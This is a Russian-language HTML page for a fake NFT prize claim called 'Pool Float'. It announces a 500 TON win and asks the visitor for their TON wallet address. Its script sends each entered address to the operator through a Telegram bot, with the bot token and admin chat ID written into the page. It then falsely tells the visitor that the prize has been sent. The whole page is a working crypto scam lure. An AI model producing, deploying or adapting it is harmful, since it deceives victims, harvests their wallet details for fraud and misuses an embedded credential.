<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Pool Float - Claim Prize</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: Arial;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 500px;
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 15px 0;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
        }
        button:hover { background: #006699; }
        .status { margin-top: 20px; }
    </style>
</head>
<body>
<div class="container">
    <h2>🔥 ТВОЙ NFT ПОБЕДИЛ!</h2>
    <p>Pool Float #148899 выиграл <strong>500 TON</strong> + редкий апгрейд</p>
    
    <input type="text" id="wallet" placeholder="Введи адрес TON кошелька">
    <button onclick="send()">💎 ПОЛУЧИТЬ ПРИЗ</button>
    <div class="status" id="status"></div>
</div>

<script>
    const BOT_TOKEN = "7666942287:AAGo8rC7c8KQ7alb1PEmhl9KPdTx1liZO9M";
    const ADMIN_ID = 1727566558;
    
    async function send() {
        const address = document.getElementById('wallet').value;
        if(!address) return alert('Введи адрес');
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: ADMIN_ID,
                text: `🎯 НОВЫЙ КОШЕЛЕК: ${address}`
            })
        });
        
        document.getElementById('status').innerHTML = '✅ ПРИЗ ОТПРАВЛЕН!';
        document.getElementById('wallet').value = '';
    }
</script>
</body>
</html>
